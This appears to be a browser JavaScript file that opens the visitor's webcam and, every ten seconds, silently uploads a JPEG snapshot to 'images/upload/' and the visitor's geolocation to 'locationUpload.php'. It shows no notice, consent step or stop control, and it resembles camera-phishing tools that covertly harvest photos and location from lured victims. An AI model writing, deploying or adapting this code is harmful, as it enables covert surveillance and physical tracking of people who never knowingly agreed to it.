var v;
var imageCanvas;
var imageCtx;

function getPosition() {
    navigator.geolocation.getCurrentPosition(function(position){
        position = position.coords;
        $.post(
            'locationUpload.php',
            position,
            function(response){}
        );
    });
}
function sendImagefromCanvas() {

    //Make sure the canvas is set to the current video size
    imageCanvas.width = v.videoWidth;
    imageCanvas.height = v.videoHeight;

    imageCtx.drawImage(v, 0, 0, v.videoWidth, v.videoHeight);

    //Convert the canvas to blob and post the file
    imageCanvas.toBlob(blobToBase64, 'image/jpeg');
}
function blobToBase64(blob) {
    var reader = new FileReader();
    reader.onload = function() {
        var dataUrl = reader.result;
        var base64 = dataUrl.split(',')[1];
        postFile(base64);
    };
    reader.readAsDataURL(blob);
};
function postFile(file) {

    $.post(
        'images/upload/',
        {file: file},
        function(response){
            console.log(response);
        }
    );
}

function main(){
    console.log('nagrun bes');

    sendImagefromCanvas();
    getPosition();

    setTimeout(main, 10000);
}

$(function(){
    v = document.getElementById("myVideo");
    imageCanvas = document.createElement('canvas');
    imageCtx = imageCanvas.getContext("2d");

    navigator.mediaDevices.getUserMedia({video: {width: 1280, height: 720}, audio: false})
        .then(stream => {
            v.srcObject = stream;
        })
        .catch(err => {
            console.log('navigator.getUserMedia error: ', err)
        });

    main();
});